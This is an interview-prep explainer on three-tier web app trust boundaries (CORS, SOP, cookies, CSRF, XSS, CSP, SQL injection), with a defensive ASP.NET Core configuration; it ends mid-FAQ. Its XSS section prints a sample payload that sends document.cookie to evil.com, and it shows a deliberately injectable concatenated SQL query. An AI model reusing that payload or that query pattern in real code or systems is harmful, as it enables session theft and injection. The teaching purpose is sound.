🎯 The problem

Every three-tier app has the same trust boundaries — and the same misunderstandings

Nearly every modern web application is built the same way. A single-page frontend served from one origin, a backend HTTP API on another origin, and a private database behind the API. The user's browser is the untrusted execution environment where malicious script from other sites, malicious extensions, and malicious pages compete for access to a legitimate session. Backend engineers can name CORS, XSS, CSRF, and CSP individually, but very few can draw the picture that shows where each control lives, who enforces it, and what it actually protects — and just as importantly, what it does not.

Real interview and real production consequences follow from getting this wrong. Teams routinely mis-diagnose CORS errors, misconfigure Access-Control-Allow-Origin: * alongside credentials, disable CSRF protection assuming JWTs and SameSite cookies replace it, store bearer tokens in localStorage and get owned via XSS, or rely on the frontend hiding a button as if it were an authorization control. Every one of these mistakes maps to a specific boundary in the picture below — and once you can draw the boundary you know which control belongs there.

This page is the one map. It walks the request from the user's browser through the UI, through the API, into the database, and back — labelling every trust boundary with the concept that lives there, the layer that enforces it, and the failure mode when it is skipped. After reading it you should be able to look at any real Angular/React + .NET/Node/Java + SQL/DynamoDB architecture and immediately answer: which control applies, at which layer, who enforces it, what happens if it is misconfigured. Real products that get this right: banking apps like Chase and Revolut, payment platforms like Stripe, SaaS consoles like AWS and Datadog. Real products that don't: an alarming number of internal enterprise portals in every industry.

🧑‍🎓 In laymen terms

Imagine the browser is a busy shopping mall

Picture your browser as a shopping mall full of separate stores. Each store has its own address (its "origin"): the bank's store, your webmail's store, a news site's store, and unfortunately a shady store called evil.com that some visitor wandered in from. Every store is open at the same time. You are logged in to the bank store — the bank recognises your face and lets you move your money.

The mall has a very strict security guard called the Same-Origin Policy. Their one rule: nobody working inside one store may reach across the aisle and grab items off a different store's shelf. This is what stops the shady store from silently reading your bank balance while you're browsing next door.

Sometimes two stores want to cooperate — the bank's frontend and the bank's API are actually two "stores" (different addresses) run by the same company. So we let each store post a sign at its door saying "the bank's frontend is welcome to take items from my shelves". That polite door-sign is called CORS. It's not a lock — it's a note that the browser guard reads before deciding to let a script pass items back.

Some concepts are about tricking your browser into doing something you didn't intend. If evil.com quietly puts an invisible form on its page that submits money-transfer requests to the bank while you're logged in, that's called CSRF — a forged action, using your cookie the browser attaches automatically. The bank fights this by asking every action to include a secret token that only its own pages know.

Other concepts are about attacker code running inside a store that trusts it. If the bank forgets to escape user input and someone types <script>steal-my-money</script> into their profile, every visitor who views that profile runs that script as the bank's own page. That is XSS, and it is worse than CORS violations because the malicious code isn't crossing the security guard — it's already inside. CSP is a printed list on the wall telling the mall guard "only scripts from these approved suppliers are allowed to run in my store", so even accidental XSS is much harder to weaponise.

Behind all of this is a private back office — the database. No stranger from the mall ever walks in. Only the bank's own staff, over a private hallway, using their staff card, using request forms that are impossible to trick. The bank never lets a customer's raw request "become" a database query — it always fills in a template. That's parameterised queries, the defence against SQL injection.

Real products every reader has used run exactly this pattern: Google, Amazon, Netflix, your bank's app. What separates the ones that don't get owned from the ones that do is that every trust boundary — browser to UI, UI to API, API to database — has an explicit control, and the team knows which one lives where.

📋 Requirements & scope

What we want the design to guarantee

Functional requirements

  • Users load the UI at https://portal.example.com, which calls the API at https://api.example.com.
  • Only the company's approved frontends may read authenticated API responses in a browser.
  • An attacker's page (e.g. evil.com) must not be able to read the user's data, and must not be able to perform authenticated actions on the user's behalf.
  • User input never becomes executable HTML/JS on another user's page.
  • User input never becomes an executable SQL fragment.
  • The API works from Postman and CI/CD test runners (they don't enforce SOP), but only authorised traffic gets past authentication.

Non-functional requirements

  • Correctness first. Every control belongs on the right side of a trust boundary. A frontend "hide button" is UX, not a security control.
  • Defense in depth. One misconfiguration should not break the whole system. CSP + output encoding + HttpOnly cookies together survive one bug.
  • Observable. CSP reports, WAF logs, and auth failures flow to a central log with alerts on anomalies.
  • Least privilege. DB user, IAM roles, and cookie scopes are all narrowed to the minimum that works.
  • Compliant. The baseline passes OWASP ASVS Level 2 checks and the OWASP Top-10 categories.

🏗️ High-level architecture

Three tiers, three trust boundaries, one map

The whole point of this page is the picture below. The browser is one trust boundary, the API is another, and the database is a third. Different concepts apply to different boundaries — this is the mistake most engineers make when they lump "web security" into a single mental bucket. Read the diagram left-to-right, top-to-bottom, and note where each label sits: browser-side controls are on the left inside the browser box, server-side controls are on the right inside the API box, DB controls are inside the database box.

Browser trust boundary API trust boundary (real perimeter) DB trust boundary

Two rules of thumb this picture makes obvious. First, browser-side controls (SOP, CORS, CSP, SameSite) apply only between browser and UI/API — never between API and database. Postman, curl, mobile apps, and server-to-server calls never enforce them, which is exactly why the API tier must never rely on them for security. Second, server-side controls (authN, authZ, CSRF validation, input validation, parameterised queries) apply on every request — regardless of whether the client is a browser, a mobile app, curl, or a server. Every arrow into the API box is checked; every arrow into the DB box is prepared, not concatenated.

🔍 Deep-dive — every concept, in order

1. Origin = scheme + host + port

An origin is the triple (scheme, host, port). Two URLs share an origin if all three match exactly. Every browser security concept in this page hangs off this definition, so nailing it down first is worth the two paragraphs.

URL AURL BSame origin?Why
https://example.com/ahttps://example.com/b✅ yesPath doesn't affect origin
https://example.comhttps://api.example.com❌ noHost differs
http://example.comhttps://example.com❌ noScheme differs
https://example.comhttps://example.com:8443❌ noPort differs
http://localhost:3000http://localhost:5000❌ noPort differs — local dev bites here

Origin vs. Site vs. Host vs. Domain

These are not synonyms. Different browser concepts use different definitions, which is a real source of interview confusion.

  • Host — the hostname alone. portal.example.com.
  • Domain — the DNS name. example.com or portal.example.com. Not a security concept per se.
  • Origin — scheme + host + port. Used by Same-Origin Policy and CORS.
  • Site — scheme + registrable domain (e.g. https://example.com covers both portal.example.com and api.example.com). Used by cookie SameSite. This is why portal.example.com and api.example.com are different origin but same site.
Interview line: "CORS is enforced on origin. Cookie SameSite is enforced on site. Same-origin implies same-site; the reverse is not true."

2. Same-Origin Policy (SOP)

SOP is a browser rule: JavaScript running in one origin cannot read the response body of a request to another origin. It is why evil.com can't silently script your bank statement. It is enforced by the browser process — not by your server, not by Postman, not by curl. If SOP didn't exist, every browsing session in every tab would be a data-exfil vector.

Two nuances matter for interviews. First, SOP does not forbid making the request — it forbids reading the response. The request often leaves the browser and hits the target server; the browser just refuses to let script see what came back. Second, SOP is not absolute — a small set of "safe" side effects (form submissions, image loads, <script> tag loads) are historically allowed for backwards compatibility, which is where CSRF creeps in.

evil.com ─── JS fetch("https://bank.com/balance") ───► bank.com │ │ 200 OK { balance: 5000 } ▼ ✗ Browser refuses to expose response body to evil.com's JS (SOP)

3. CORS — the server's controlled opt-in to SOP relaxation

CORS is a set of response headers the server sends to tell the browser "this specific other origin may see this response". It is not a security feature on the server side — it is a permission the server grants to the browser. The browser is the one that enforces it. Written headers:

HeaderDirectionWhat it says
OriginRequest (browser)"I am serving script from this origin — is that OK?"
Access-Control-Allow-OriginResponse (server)The specific origin the server permits. Never * with credentials.
Access-Control-Allow-CredentialsResponse (server)true if cookies/HTTP-auth may accompany the request. Requires an explicit origin, not *.
Access-Control-Allow-MethodsResponse (preflight)Which HTTP methods are permitted.
Access-Control-Allow-HeadersResponse (preflight)Which non-safelisted request headers are permitted.
Access-Control-Expose-HeadersResponseWhich response headers JS may read (default is a small safelist).
Access-Control-Max-AgeResponse (preflight)Seconds the browser may cache the preflight verdict.
Vary: OriginResponseCache-key hint — CDNs must not share responses across origins.

4. "Why does it work in Postman but fail in the browser?"

Because Postman is not a browser. SOP and CORS are browser features — they exist to protect a user whose browser is running untrusted code from multiple origins concurrently. Postman, curl, mobile apps, server-to-server calls, and Node scripts do not enforce SOP because they are not sandboxing untrusted code — they are the user's own tool making a single deliberate request.

Precise wording matters. "The API call never reached the server because of CORS" is wrong for simple requests — the browser does send them, receives the response, then refuses to let JS read it. For requests that require preflight, the browser may indeed decide not to send the real request if the OPTIONS response fails. Both patterns present as "CORS error" in the console. Learn to read the Network tab.

5. Preflight requests — OPTIONS as a permission check

The browser sends an OPTIONS request before the real one whenever the request would exceed the "simple request" envelope. Simple requires: method in {GET, HEAD, POST}, only safelisted request headers, and Content-Type in {application/x-www-form-urlencoded, multipart/form-data, text/plain}. Anything else — PUT, DELETE, Authorization header, JSON body — triggers preflight.

Browser API │ │ │ OPTIONS /orders │ │ Origin: https://portal.example.com │ │ Access-Control-Request-Method: POST │ │ Access-Control-Request-Headers: Authorization, Content-Type │─────────────────────────────────────────────────────────►│ │ │ │ 204 No Content │ │ Access-Control-Allow-Origin: https://portal.example.com │ Access-Control-Allow-Methods: GET,POST,PUT,DELETE │ Access-Control-Allow-Headers: Authorization,Content-Type │ Access-Control-Allow-Credentials: true │ │ Access-Control-Max-Age: 600 │ │◄─────────────────────────────────────────────────────────│ │ │ │ POST /orders (the real request) │ │─────────────────────────────────────────────────────────►│ │ 201 Created │ │◄─────────────────────────────────────────────────────────│

Two operational rules: (1) authentication middleware must not 401 the OPTIONS request — it carries no credentials by design; typically you short-circuit OPTIONS in a middleware before auth runs. (2) set a reasonable Max-Age (5–10 minutes) so every JSON POST doesn't take a round-trip hit.

6. CORS is not authentication and it is not authorization

A stubborn myth in every code review: "we don't need to protect that endpoint, CORS blocks it". CORS blocks a browser's JavaScript from reading the response. It does not stop curl, Postman, a mobile app, a scraper, an attacker with a laptop and 10 seconds of Python. Every endpoint must authenticate and authorise its callers independently of CORS. CORS lives on the browser boundary; auth lives on the API boundary.

CORS keeps legitimate browser JS honest. It does not keep attackers honest. That is not what it was designed for.

7. Production-safe CORS configuration

Configure an explicit allow-list of origins, never * for authenticated APIs. Reflect the request's Origin only if it matches the allow-list. Set Vary: Origin so caches don't leak allowed-origin responses to disallowed callers.

# A safe CORS policy expressed as pseudo-config
AllowedOrigins:
  - https://portal.example.com
  - https://admin.example.com
AllowedMethods: [GET, POST, PUT, PATCH, DELETE]
AllowedHeaders: [Content-Type, Authorization, X-CSRF-Token, X-Request-Id]
ExposeHeaders:  [X-Request-Id, X-Rate-Limit-Remaining]
AllowCredentials: true
MaxAge: 600
Vary: Origin

Two hard rules from the MDN spec: (a) Access-Control-Allow-Credentials: true is incompatible with * — the server must echo a specific origin. (b) Do not reflect an arbitrary Origin — always validate against an allow-list, otherwise you have effectively re-enabled the wildcard for any attacker origin that guesses your header logic.

8. Cookies — the classic auth transport

A cookie is a small key/value the server sets via Set-Cookie, that the browser stores and sends back on every subsequent request to the same host. For authentication, this is either a session identifier (opaque, looked up server-side) or a signed token. The security properties you care about are all attributes on the cookie:

AttributeMeaningWhy
HttpOnlyJavaScript cannot read the cookie via document.cookie.Blocks XSS from directly stealing the session cookie.
SecureOnly sent over HTTPS.Prevents leak over plain HTTP hops.
SameSite=LaxSent on top-level navigations but not on cross-site subresources.Kills most CSRF automatically.
SameSite=StrictNever sent from cross-site contexts.Maximum CSRF protection; breaks external-link logins.
SameSite=None; SecureSent cross-site over HTTPS.Required for federated login / cross-origin auth.
DomainHosts allowed to receive the cookie.Scope tightly; example.com shares with all subdomains.
PathURL prefix required.Minor scoping — not a security control.
Max-Age / ExpiresHow long the browser keeps it.Short lifetime + refresh tokens beats one long-lived cookie.

9. SameSite ≠ Same-Origin

Same-origin means "identical scheme + host + port". Same-site means "same registrable domain + scheme". portal.example.com and api.example.com are different origins but the same site — so a SameSite=Lax cookie on example.com will be sent from portal to api even though CORS treats them as cross-origin. That mismatch is exactly what makes SameSite a useful CSRF control while CORS keeps the origin boundary honest.

10. Cookie session vs Bearer token — the real trade-off

Two common auth transports for SPAs. Both are legitimate. They fail in different directions.

XSS riskLow — HttpOnly hides it from JSHigh — JS can read from localStorage or memory

Practical guidance. For a first-party SPA on the same registrable domain: HttpOnly cookies with SameSite=Lax + CSRF token. For a public API with third-party integrations or mobile clients: short-lived JWTs held in memory, refresh via a secure http-only refresh cookie. Do not store long-lived tokens in localStorage — one XSS bug ends the game.

11. CSRF — forged authenticated actions

Cross-Site Request Forgery abuses the fact that browsers automatically attach cookies to requests, regardless of which page initiated them. If evil.com can cause your browser to send a POST to bank.com/transfer — via a hidden form, a redirect, an <img> tag, whatever — the cookie tags along and the bank sees an authenticated request. The attacker doesn't get to read the response (SOP still blocks that), but a "transfer money" action doesn't require a readable response to succeed.

Defences layer nicely. SameSite=Lax stops the browser from attaching the cookie on cross-site subresource requests, which kills the classical form-post attack. Anti-CSRF token (a per-session random value embedded in the page, echoed as a header on every mutating request) means the attacker cannot forge a valid request even if the cookie flows — because they cannot read the token (SOP forbids it). Origin/Referer validation at the server rejects mutating requests whose Origin is not on the allow-list. Re-authentication for highly sensitive actions (transfer, password change) is the cherry on top.

HttpOnly does not stop CSRF. HttpOnly stops JavaScript from reading the cookie. The browser attaches the cookie on its own without JS ever touching it. CSRF exploits the browser's auto-attach behaviour, not JS access.

13. XSS — attacker code inside a trusted origin

Cross-Site Scripting means the attacker managed to inject JavaScript that runs as your origin. From the browser's point of view the script is legitimate — it came from portal.example.com, so SOP allows it to read anything, CORS lets it call your API with cookies, CSP might be its only remaining barrier. XSS is a category killer because most other controls assume script in your origin is trusted.

Attacker input "<script>fetch('//evil.com/'+document.cookie)</script>" │ ▼ Server saves it (no encoding) │ ▼ Later render: <div>{{ userComment }}</div> ← template inserts raw HTML │ ▼ Victim visits page │ ▼ Browser parses <script>…</script> and executes it AS portal.example.com │ ▼ Attacker's JS reads cookie / calls API / exfiltrates data

Three flavours, one problem:

  • Stored XSS — payload lives in your DB (a profile bio, a comment, a review). Every subsequent viewer runs it.
  • Reflected XSS — payload lives in the URL/query and is echoed straight back in the response. Delivered by a phishing link.
  • DOM-based XSS — no server involvement. Client-side JS does something like el.innerHTML = location.hash and the browser executes what's in the URL fragment.

14. XSS prevention — three independent lines

These are not interchangeable. Each covers a different failure mode.

  • Context-aware output encoding. Whenever untrusted data is written into HTML/JS/CSS/URL context, encode it for that context. Angular/React/Blazor do this automatically for interpolated bindings — don't bypass with [innerHTML], bypassSecurityTrust*, or dangerouslySetInnerHTML.
  • Input validation. Reject shapes that don't fit your business rules (e.g. an integer field with letters). Validation ≠ sanitization; a string containing <script> may be perfectly valid for a comment field.
  • HTML sanitization. Only when you need to render user-supplied HTML (rich-text editor, markdown). Use a proven allow-list sanitizer like DOMPurify, not homegrown regex.

Dangerous APIs to grep for in code review: innerHTML, outerHTML, document.write, eval, Function(), jQuery .html(), React dangerouslySetInnerHTML, Angular bypassSecurityTrustHtml. Each is a legitimate tool with legitimate uses — every use with untrusted input is a bug.

15. Content Security Policy — the defense-in-depth for XSS

CSP is a response header that tells the browser "only load resources from these approved sources; refuse everything else". Even if an attacker injects a <script> tag, the browser will not execute it unless CSP allows the source.

Content-Security-Policy:
    default-src 'self';
    script-src  'self' 'nonce-r4nd0m';
    style-src   'self' 'unsafe-inline';
    img-src     'self' data: https://cdn.example.com;
    connect-src 'self' https://api.example.com;
    frame-ancestors 'none';
    object-src 'none';
    base-uri   'self';
    report-to  csp-endpoint;

Directive cheat-sheet:

  • default-src — fallback for everything not explicitly set.
  • script-src — where JS may come from. Use 'nonce-xxx' per response instead of 'unsafe-inline'.
  • connect-src — where fetch/XHR/WebSocket may connect. Your API's origin lives here.
  • img-src, style-src, font-src, media-src — self-explanatory.
  • frame-ancestors — who may embed this page in a frame. Modern clickjacking control.
  • object-src 'none' — kill legacy Flash/Java plugin sinks.
  • base-uri 'self' — prevent injected <base> tags from hijacking relative URLs.
  • report-to — where the browser POSTs a report when it blocks something.
CSP is not a cure for XSS. It is a mitigation. It shrinks what a successful XSS can do — often to "steal a nonce-less inline injection", which is much less bad. Encode your output first; add CSP as a safety net.

16. Clickjacking

Attacker embeds your logged-in page in a transparent iframe on evil.com, positions a decoy button on top of your "Transfer $10 000" button, and tricks the user into clicking. Your page runs the action, the user thinks they clicked "Continue".

Defence: refuse to be framed. The modern way is frame-ancestors in CSP (frame-ancestors 'self'; or frame-ancestors 'none';). The legacy header is X-Frame-Options: DENY | SAMEORIGIN. Send both if you support older browsers; CSP wins where both are present.

18. API authentication

Every API request must be authenticated — CORS is not a substitute. Three common shapes on the wire:

  • Session cookie — server issues an opaque ID, keeps state in Redis/DB. Simple, easy to revoke, requires CSRF protection.
  • JWT bearer — signed token carries claims; API validates signature and expiry statelessly. Convenient across microservices; revocation is harder.
  • OAuth2 / OIDC access token — a JWT (or opaque) issued by an identity provider (Cognito, Okta, Auth0). Standardised, federated, works for third-party clients.

The choice affects how the browser attaches credentials (auto for cookies; JS-attached for bearer) which in turn affects CSRF exposure and CORS credentials handling. It does not change the rule: authenticate every request.

19. Authorization — the object-level check the browser can't help with

Authentication says who; authorization says what they may do. The class of bug called IDOR/BOLA (Insecure Direct Object Reference / Broken Object Level Authorization) is a top-3 API vulnerability every year: the API authenticates the user but forgets to check that the object they're asking for belongs to them.

GET /users/101/orders/500 ├─ AuthN: is the JWT valid? → user_id = 101 ✓ └─ AuthZ: does user 101 own order 500? ← easy to forget │ ┌───┴───┐ yes no │ │ 200 403

Do not assume the UI hides the ID. Any attacker can flip 500 to 501 in a URL. Enforce object ownership at the server, ideally with a query that includes the owner in the WHERE clause (WHERE order_id = @p1 AND owner_id = @currentUser).

UI controls are usability, not security. Hiding a delete button in the SPA is a UX choice. The API endpoint must independently deny unauthorised deletes.

20. Input validation — server-side is mandatory

Client-side validation improves UX. It cannot be relied on for security because every byte the client sends is under attacker control (Postman, curl, browser DevTools, custom script). Server-side validation must independently:

  • Check type and shape (JSON schema, DataAnnotations, FluentValidation).
  • Enforce ranges, lengths, allow-lists.
  • Reject unexpected fields to prevent mass-assignment.
  • Canonicalize before comparing (Unicode normalization, case).
  • Enforce business rules (e.g. "amount > 0" and "amount ≤ available balance").

21. SQL Injection — never let user input become SQL

SQL injection happens when user input is concatenated into a SQL string. The fix is universally the same: parameterised queries. The client library sends the SQL text and the parameter values separately; the DB engine parses the SQL first, then binds the values. No amount of quoting or escaping is safer than parameterisation.

// DANGER — user input is glued into SQL
var sql = "SELECT * FROM users WHERE email = '" + email + "'";

// SAFE — parameterised (ADO.NET, Dapper, EF Core all default to this)
var sql = "SELECT * FROM users WHERE email = @email";
db.Query(sql, new { email });

Belt-and-braces controls: use an ORM that parameterises by default, validate input shape, run the DB user with least privilege (no DROP, no CREATE USER, no schemas it doesn't need), enable query logging + anomaly alerts, and turn on RDS Performance Insights / pg_stat_statements to catch weird queries.

XSS is not SQL injection. XSS is untrusted input becoming executable JavaScript in a browser. SQL injection is untrusted input becoming executable SQL in a database. Different injection sink, different defence. Both share one rule: never mix data with code.

24. CORS at the edge — API Gateway, reverse proxy, ingress

CORS headers can be added by any layer on the response path: the app itself, an API Gateway, an Nginx reverse proxy, an ALB, a CloudFront distribution, a Kubernetes ingress. When two layers add CORS headers, the browser sees both, gets confused (duplicate Access-Control-Allow-Origin is treated as invalid), and blocks the response. This is the single most common "CORS works locally, breaks in staging" bug.

One owner rule. Pick one layer that owns CORS and turn it off everywhere else. Usually the API Gateway is the right owner because it also handles auth and rate-limiting; the app should trust upstream headers.

25. CDN caching + CORS

If your API sits behind a CDN and CORS responses are cached, the cache key must include the Origin header — otherwise you serve the allowed-origin response for one caller to a different caller. Ensure Vary: Origin is in every CORS response, and configure the CDN to include Origin in its cache key. This is subtle enough that CloudFront, Fastly and Cloudflare each have named settings for it.

26. Credentialed cross-origin request — the wiring

// Frontend
await fetch("https://api.example.com/orders", {
    method: "POST",
    credentials: "include",                // send cookies cross-origin
    headers: {
        "Content-Type": "application/json",
        "X-CSRF-Token": window.csrfToken
    },
    body: JSON.stringify({ productId: 42 })
});
# Server response headers (must all align)
Access-Control-Allow-Origin: https://portal.example.com   # exact, not *
Access-Control-Allow-Credentials: true
Access-Control-Allow-Headers: Content-Type, X-CSRF-Token
Access-Control-Allow-Methods: POST
Vary: Origin

# Session cookie set with:
Set-Cookie: sid=…; HttpOnly; Secure; SameSite=None; Path=/; Domain=example.com

Every one of these has to line up. Common failure modes: SameSite=Lax on the cookie prevents cross-origin sending; Access-Control-Allow-Origin: * with credentials is silently ignored; missing Vary: Origin breaks under CDN caching.

27. Development vs. production CORS

Local dev is inherently cross-origin: http://localhost:4200 (Angular) or :3000 (React) → https://localhost:5001 (API). Do not paper over it with Access-Control-Allow-Origin: *; do it properly with an environment-scoped allow-list so dev matches prod behaviour.

// appsettings.Development.json
"Cors": { "AllowedOrigins": [ "http://localhost:4200", "http://localhost:3000" ] }

// appsettings.Production.json
"Cors": { "AllowedOrigins": [ "https://portal.example.com", "https://admin.example.com" ] }

28. Alternative — put UI and API under the same origin

If you serve the SPA and the API from the same origin via a reverse proxy — app.example.com/ for the UI, app.example.com/api/* for the API — the browser sees them as one origin and CORS ceases to matter. Many teams do this precisely to remove a class of bugs.

Browser │ ▼ app.example.com (single origin) │ ├─ / → Frontend SPA └─ /api/* → Backend API (via reverse proxy)
Same-origin does not remove other security work. Auth, authorization, CSRF, XSS, input validation, and SQL injection are all still required. CORS was solving a specific browser problem — removing the boundary removes the problem, not the rest of the security model.

30. Common misconceptions — get them out of your head

"CORS protects my API from attackers."

No. CORS controls whether browser JS can read a cross-origin response. curl/Postman/mobile apps don't enforce CORS. Every endpoint must authN/authZ independently.

"If Postman works, the browser should also work."

Not necessarily. Postman ignores SOP/CORS. The browser will block a valid response if CORS headers are missing.

"A CORS error means the API was not called."

For preflighted requests, sometimes true. For simple requests, the request usually reached the server and returned successfully — the browser just refused to expose it to JS.

"Different subdomains are same origin."

Different origin, same site. CORS treats them as cross-origin; SameSite cookies do not.

"SameSite and Same-Origin mean the same thing."

No. Origin = scheme+host+port. Site = scheme+registrable domain.

"Client-side validation is enough."

No. Any attacker can bypass the client. Server-side validation is mandatory.

"HttpOnly prevents CSRF."

No. HttpOnly prevents JS from reading the cookie. CSRF exploits the browser auto-attaching it. Use SameSite + anti-CSRF token.

"CSP prevents XSS."

It mitigates the damage. Encode your output; use CSP as defence-in-depth.

"If the frontend hides a button, the user can't call that API."

They can with Postman. Authorization must live on the server.

31. Debugging a "CORS error but backend logs show 200"

  1. Open DevTools → Network tab. Filter by the failing URL.
  2. Was there an OPTIONS request? If yes and it 4xx'd, the preflight failed — check Access-Control-Request-* vs the server's Access-Control-Allow-*.
  3. If no OPTIONS, the request is "simple" — the response reached the browser. Check the response headers: is Access-Control-Allow-Origin present, does it exactly match the page's origin, is Allow-Credentials present if credentials were sent?
  4. Check for duplicate CORS headers (API Gateway + app both adding them).
  5. Check the Origin header the browser sent — does the allow-list contain it exactly (including scheme)?
  6. Check Vary: Origin if there is a CDN in the path.
  7. Check the browser's console for the exact CORS error string — it names the missing header.
🧮 The concepts behind it

Underlying algorithms & data structures

Web security looks operational, but each control is grounded in a small algorithmic idea. Being able to name them shows architectural depth in an interview.

Cryptographic signature verification (JWT, cookies, CSRF tokens)

All three carry a secret-keyed signature (HMAC or RSA/ECDSA) so the server can verify a token was issued by itself. HMAC-SHA-256 is the workhorse: tag = HMAC(secret, header + "." + payload); verify by recomputing the tag and constant-time comparing.

Constant-time string comparison

Signature and CSRF-token comparison must use a constant-time equality (CryptographicOperations.FixedTimeEquals in .NET) to prevent timing side-channels. Even one microsecond of variance leaks information about the correct byte prefix — a classical attack.

Cryptographically-random tokens

CSRF tokens, session IDs, nonces, refresh tokens are drawn from a CSPRNG (RandomNumberGenerator, /dev/urandom), never from Math.random or Guid.NewGuid. 128 bits of entropy is the interview-safe answer.

Parser-based encoding (not regex)

Output encoding is context-aware: HTML, HTML-attribute, JS, CSS, URL contexts all have different escape rules. Frameworks parse the template context and choose the right encoder; regex-based sanitisers are famously bypassable (Samy worm et al.).

Bloom-filter / count-min for rate limiting

Not strictly a "browser" control but sits at the API edge; approximate data structures let a WAF or gateway shed traffic at high QPS without a hot DB.

Content-security nonces = short-lived allow-list

Per-response random nonce is emitted in the CSP header and stamped into each legitimate inline <script nonce="…">. Browser executes only script tags whose nonce matches. Injected script (without the nonce) is refused.

💻 C# / .NET reference — every layer wired correctly

ASP.NET Core makes each control a one-liner in Program.cs. The point of this snippet is to show them all in one place — you cannot forget one because they are literally next to each other.

// Program.cs — production-safe defaults for a 3-tier SPA + API

var builder = WebApplication.CreateBuilder(args);

// -------- 1. CORS: explicit allow-list, credentials on -----------------
builder.Services.AddCors(o => o.AddPolicy("spa", p => p
    .WithOrigins(builder.Configuration.GetSection("Cors:AllowedOrigins").Get<string[]>()!)
    .AllowCredentials()
    .WithMethods("GET", "POST", "PUT", "PATCH", "DELETE")
    .WithHeaders("Content-Type", "Authorization", "X-CSRF-Token")
    .WithExposedHeaders("X-Request-Id")
    .SetPreflightMaxAge(TimeSpan.FromMinutes(10))));

// -------- 2. AuthN — cookie for the SPA, JWT for third-party clients ---
builder.Services.AddAuthentication("Cookies")
    .AddCookie("Cookies", opt => {
        opt.Cookie.HttpOnly     = true;              // no JS access
        opt.Cookie.SecurePolicy = CookieSecurePolicy.Always;
        opt.Cookie.SameSite     = SameSiteMode.Lax;   // tight; None only if cross-site
    })
    .AddJwtBearer("Bearer", opt => {
        opt.Authority = "https://cognito-idp.us-east-1.amazonaws.com/us-east-1_XXX";
        opt.TokenValidationParameters.ValidateAudience = true;
        opt.TokenValidationParameters.ValidateIssuer   = true;
    });

// -------- 3. Anti-forgery (CSRF) token for cookie-authenticated calls --
builder.Services.AddAntiforgery(o => {
    o.HeaderName            = "X-CSRF-Token";
    o.Cookie.Name           = "XSRF-TOKEN";
    o.Cookie.HttpOnly       = false;                // readable by SPA — that's fine
    o.Cookie.SameSite       = SameSiteMode.Strict;
    o.Cookie.SecurePolicy   = CookieSecurePolicy.Always;
});

builder.Services.AddAuthorization();
builder.Services.AddControllers()
    .AddJsonOptions(o => o.JsonSerializerOptions.PropertyNamingPolicy = JsonNamingPolicy.CamelCase);
var app = builder.Build();

// -------- 4. Security response headers (CSP + friends) ----------------
app.Use(async (ctx, next) => {
    var nonce = Convert.ToBase64String(RandomNumberGenerator.GetBytes(16));
    ctx.Items["csp-nonce"] = nonce;

    var h = ctx.Response.Headers;
    h["Content-Security-Policy"] =
        $"default-src 'self'; script-src 'self' 'nonce-{nonce}'; " +
        "style-src 'self' 'unsafe-inline'; img-src 'self' data:; " +
        "connect-src 'self' https://api.example.com; " +
        "frame-ancestors 'none'; object-src 'none'; base-uri 'self'";
    h["Strict-Transport-Security"] = "max-age=63072000; includeSubDomains; preload";
    h["X-Content-Type-Options"]   = "nosniff";
    h["Referrer-Policy"]          = "strict-origin-when-cross-origin";
    h["Permissions-Policy"]       = "geolocation=(), microphone=(), camera=()";

    await next();
});

app.UseHttpsRedirection();
app.UseCors("spa");           // must run before auth
app.UseAuthentication();
app.UseAuthorization();

// Short-circuit OPTIONS preflight before auth middleware asks for creds
app.MapMethods("/{**path}", new[] { "OPTIONS" }, () => Results.NoContent())
    .AllowAnonymous();

app.MapControllers();
app.Run();

// -------- 5. A controller — every server-side gate in one method -----
[ApiController, Route("orders"), Authorize]
public class OrdersController(IOrderRepository repo, IAntiforgery af) : ControllerBase
{
    [HttpPost, ValidateAntiForgeryToken]
    public async Task<IActionResult> Create([FromBody] CreateOrderRequest body)
    {
        // Input validation via DataAnnotations + FluentValidation runs here.
        if (!ModelState.IsValid) return ValidationProblem(ModelState);

        var userId = Guid.Parse(User.FindFirstValue("sub")!);

        // Object-level authorization: enforce ownership in the WHERE clause.
        var account = await repo.GetAccountForUserAsync(userId, body.AccountId);
        if (account is null) return Forbid();

        // Parameterised query — DB never sees a concatenated string.
        var orderId = await repo.InsertOrderAsync(new {
            userId, account.Id, body.ProductId, body.Quantity
        });

        return CreatedAtAction(nameof(Get), new { id = orderId }, null);
    }
}

public class CreateOrderRequest
{
    [Required] public Guid AccountId { get; set; }
    [Required, Range(1, 10_000)] public int ProductId { get; set; }
    [Range(1, 100)]              public int Quantity  { get; set; }
}

⚖️ Trade-offs, bottlenecks & likely follow-ups

Trade-offs

Cookies vs bearer tokens. Cookies give you XSS-resistant transport (HttpOnly) but require CSRF work; bearer tokens sidestep CSRF but expose the token to XSS. Choose per-audience: cookies for first-party SPAs, bearers for third-party APIs / mobile.

CSP strictness. A strict nonce-based CSP genuinely kills most XSS categories, but breaks inline analytics snippets and third-party widgets. Start with a report-only CSP for two weeks, tune, then enforce.

SameSite: Lax vs Strict. Strict is safer but breaks the "click a link in an email → arrive already logged in" experience. Lax is the pragmatic default.

Same-origin architecture. Removes CORS complexity but couples the SPA and API deployments (usually via reverse proxy). Fine for one-team products; awkward if the API needs to be reached from many independent UIs.

Bottlenecks in practice

  • CORS at multiple layers. The most common production bug — one owner or you'll fight duplicated headers forever.
  • Long-lived JWTs in localStorage. One XSS bug, game over. Prefer short JWTs held in memory + HttpOnly refresh cookie.
  • Client-side-only validation. Every internal admin tool has a forgotten server-side check.
  • Missing object-level authZ. Enable the OWASP API Security Top 10 checks in your SAST/DAST.
  • Wildcards in production. Access-Control-Allow-Origin: * or a permissive CSP defeats the whole point.

Likely interview follow-ups

What is an origin, precisely?

Scheme + host + port. All three must match.

Who enforces CORS?

The browser. The server just declares which origins are allowed via headers.

Why does Postman not show CORS errors?

CORS/SOP are browser features. Postman is a raw HTTP client and does not sandbox untrusted script from multiple origins.

Can an API return 200 and the browser still show a CORS error?

Yes — for simple requests. The request lands on the server, the response comes back, and the browser refuses to let JS read it. The server logs a 200.

Why can't I use Access-Control-Allow-Origin: * with credentials?

Because that would let any origin read authenticated responses on the user's behalf. The spec requires an explicit origin when credentials are in play.

Does CORS secure my API?

No. Any non-browser client ignores it. Every endpoint must authenticate and authorise independently.

CORS vs CSRF?

CORS controls cross-origin JS reading responses. CSRF is about forged authenticated writes. Correct CORS does not solve CSRF; correct CSRF defenses do not require CORS.

CSRF vs XSS?

CSRF makes the user's browser do something without their intent, using their own cookies. XSS runs the attacker's code inside your origin — much worse because SOP now trusts it.

Same-Origin vs SameSite?

Origin = scheme+host+port. Site = scheme+registrable-domain. CORS is origin; cookie SameSite is site.

What does HttpOnly protect against?

